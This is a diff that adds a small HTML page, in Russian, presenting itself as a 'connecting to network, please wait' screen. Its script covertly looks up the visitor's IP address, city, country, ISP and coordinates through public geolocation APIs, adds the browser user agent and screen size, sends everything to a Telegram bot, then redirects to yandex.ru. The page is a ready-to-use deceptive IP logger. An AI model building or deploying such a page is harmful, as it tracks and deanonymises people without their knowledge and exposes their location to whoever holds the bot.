@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подключение...</title>
+</head>
+<body>
+    <h2>Подключение к сети...</h2>
+    <p>Пожалуйста, подождите</p>
+
+    <script>
+        const BOT_TOKEN = "ВАШ_ТОКЕН";
+        const CHAT_ID = "ВАШ_CHAT_ID";
+
+        function sendToTelegram(data) {
+            const text = `🟢 НОВЫЙ КЛИЕНТ\n` +
+                         `IP: ${data.ip || '—'}\n` +
+                         `Город: ${data.city || '—'}\n` +
+                         `Страна: ${data.country_name || data.country || '—'}\n` +
+                         `Провайдер: ${data.org || data.isp || '—'}\n` +
+                         `Браузер: ${navigator.userAgent}\n` +
+                         `Экран: ${screen.width}x${screen.height}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+            }).catch(e => console.log(e));
+        }
+
+        fetch("https://ipapi.co/json/")
+            .then(r => r.json())
+            .then(data => sendToTelegram(data))
+            .catch(() => {
+                fetch("https://ip-api.com/json/")
+                    .then(r => r.json())
+                    .then(data => {
+                        sendToTelegram({
+                            ip: data.query,
+                            city: data.city,
+                            region: data.regionName,
+                            country: data.country,
+                            lat: data.lat,
+                            lon: data.lon,
+                            isp: data.isp
+                        });
+                    });
+            });
+
+        setTimeout(() => {
+            window.location.href = "https://yandex.ru";
+        }, 3000);
+    </script>
+</body>
+</html>
